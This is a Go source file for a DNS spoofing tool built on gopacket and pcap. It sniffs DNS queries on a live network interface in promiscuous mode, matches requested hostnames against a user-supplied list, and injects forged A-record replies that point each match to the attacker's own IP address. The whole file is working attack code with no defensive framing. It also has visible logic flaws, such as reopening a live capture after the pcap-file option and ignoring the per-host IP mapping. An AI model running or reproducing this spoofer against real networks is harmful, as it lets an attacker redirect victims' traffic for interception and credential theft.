package main

import (
	"bufio"
	"flag"
	"log"
	"os"
	"regexp"
	"strings"
	"time"

	"fmt"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	snapshot_len    int32 = 65535
	handle          *pcap.Handle
	timeout         time.Duration = -1 * time.Second
	strPattern      *string
	err             error
	promiscous      bool = true
	hnamepairs      map[string]string
	IPaddr_attacker net.IP
	dev             [30]string
	//pre-allocating space needed for layers
	ethLayer  layers.Ethernet
	ipv4Layer layers.IPv4
	udpLayer  layers.UDP
	dnsLayer  layers.DNS
	question  layers.DNSQuestion
	dnsrr     layers.DNSResourceRecord
)

func main() {

	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	var interfaceName = devices[0].Name

	pcapfileFlag := flag.String("r", "", "a string")
	fileFlag := flag.String("f", "", "a string")
	interf := flag.String("i", interfaceName, "a string")

	flag.Parse()

	var filter = flag.Arg(0)

	hnamepairs = make(map[string]string)

	if *pcapfileFlag != "" {
		// Opening pcap file
		if handle, err = pcap.OpenOffline(*pcapfileFlag); err != nil {
			panic(err)
		}
	} else {
		// Opening device for Live Capture
		if handle, err = pcap.OpenLive(*interf, snapshot_len, promiscous, timeout); err != nil {
			panic(err)
		}
		fmt.Println("Reading from interface ", *interf)

	}

	if *fileFlag != "" {
		f, err := os.Open(*fileFlag)

		if err != nil {
			log.Fatal(err)
		}

		scanner := bufio.NewScanner(f)

		for scanner.Scan() {
			if scanner.Text() != "" {
				words := strings.Fields(scanner.Text())
				hnamepairs[words[1]] = words[0]
			}
		}

		if err := scanner.Err(); err != nil {
			log.Fatal(err)
		}
	}

	IPaddr_attacker = interface_IP(*interf)

	if len(hnamepairs) == 0 {

		hnamepairs[""] = string(interface_IP(*interf))
		fmt.Println("Retrieving replies from all DNS requests")
	} else {

		fmt.Println("Retrieving replies from all DNS requests with these hosts")
	}

	fmt.Println(hnamepairs)

	if filter != "" {
		filter = filter + " and udp port 53"
	} else {
		filter = "udp port 53"
	}

	if filter != "" {
		// Setting a BPF filter given by the user for capturing a subset of the traffic
		err = handle.SetBPFFilter(filter)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println("Only capturing packets with filter ", filter)
	}

	handle, err = pcap.OpenLive(*interf, snapshot_len, promiscous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	
	fmt.Println("Reading from interface", *interf)

	//Setting a BPF filter given by the user for capturing a subset of the traffic
	err = handle.SetBPFFilter(filter)
	if err != nil {
		log.Fatal(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for Packet := range packetSource.Packets() {
		Packet_Spoof(Packet, handle, hnamepairs, IPaddr_attacker)
	}

}

func interface_IP(ifacename string) net.IP {

	// get the list of interfaces
	ifaces, err := net.Interfaces()
	if err != nil {
		panic(err)
	}

	// loop through them to get our local address
	for i := range ifaces {

		// check it's the interface we want
		if ifaces[i].Name != ifacename {
			continue
		}

		// get the addresses
		addrs, err := ifaces[i].Addrs()
		if err != nil {
			panic(err)
		}

		// check to ensure there is an address on this interface
		if len(addrs) < 1 {
			panic("No address on target interface")
		}

		// use the first available address
		ip, _, err := net.ParseCIDR(addrs[0].String())
		if err != nil {
			panic(err)
		}

		return ip

	}
	return nil
}

func Packet_Spoof(Packet gopacket.Packet, handle *pcap.Handle, hnamepairs map[string]string, IPaddr_attacker net.IP) {

	// creating the decoder for fast-packet decoding
	// (using the fast decoder takes about 10% the time of normal decoding)
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)

	// this will hold the names of the layers successfully decoded
	decodedLayers := make([]gopacket.LayerType, 0, 4)

	err := decoder.DecodeLayers(Packet.Data(), &decodedLayers)

	if err != nil {
		fmt.Println("Unable to decode the layers: ", err)
	}

	if dnsLayer.QR == false {
		// pre-allocating loop counter
		var i uint16

		for i = 0; i < dnsLayer.QDCount; i++ {

			if hnamepairs == nil {
				spoofResponse(handle, IPaddr_attacker, i)
			}
			for hname, _ := range hnamepairs {
				match, _ := regexp.MatchString(strings.ReplaceAll(hname, "*", "([a-z\\.\\/\\:]*)"), string(dnsLayer.Questions[i].Name))
				if match {
					spoofResponse(handle, IPaddr_attacker, i)
				}
			}
		}
	}
}

func spoofResponse(handle *pcap.Handle, IPaddr_attacker net.IP, i uint16) {

	var j uint16

	dnsLayer.QR = true
	// pre-creating the response with most of the data filled out
	dnsrr.Type = layers.DNSTypeA
	dnsrr.Class = layers.DNSClassIN
	dnsrr.TTL = 300

	// creating a buffer for writing output packet
	outbuf := gopacket.NewSerializeBuffer()

	// setting the arguments for serialization
	serialOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// if recursion was requested, it is available
	if dnsLayer.RD {
		dnsLayer.RA = true
	}

	// for each question
	for j = 0; j < dnsLayer.QDCount; j++ {

		// get the question
		question = dnsLayer.Questions[i]

		// verify this is an A-IN record question
		if question.Type != layers.DNSTypeA || question.Class != layers.DNSClassIN {
			continue
		}

		dnsrr.IP = IPaddr_attacker

		// copy the name across to the response
		dnsrr.Name = question.Name

		// append the answer to the original query packet
		dnsLayer.Answers = append(dnsLayer.Answers, dnsrr)
		dnsLayer.ANCount = dnsLayer.ANCount + 1

	}

	var ipv4Addr net.IP
	var udpPort layers.UDPPort
	var ethMac net.HardwareAddr

	// swap ethernet macs
	ethMac = ethLayer.SrcMAC
	ethLayer.SrcMAC = ethLayer.DstMAC
	ethLayer.DstMAC = ethMac

	// swap the ip
	ipv4Addr = ipv4Layer.SrcIP
	ipv4Layer.SrcIP = ipv4Layer.DstIP
	ipv4Layer.DstIP = ipv4Addr

	// swap the udp ports
	udpPort = udpLayer.SrcPort
	udpLayer.SrcPort = udpLayer.DstPort
	udpLayer.DstPort = udpPort

	// set the UDP to be checksummed by the IP layer
	err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
	if err != nil {
		panic(err)
	}

	// serialize packets
	err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
	if err != nil {
		panic(err)
	}

	err = handle.WritePacketData(outbuf.Bytes())
	if err != nil {
		panic(err)
	}

	// printing spoofed response

	fmt.Printf(" Spoofed Response: IP %v:%v > %v:%v %d %s\n", ipv4Layer.SrcIP, udpLayer.SrcPort, ipv4Layer.DstIP, udpLayer.DstPort, int(dnsLayer.ID), dnsrr.Name)

}
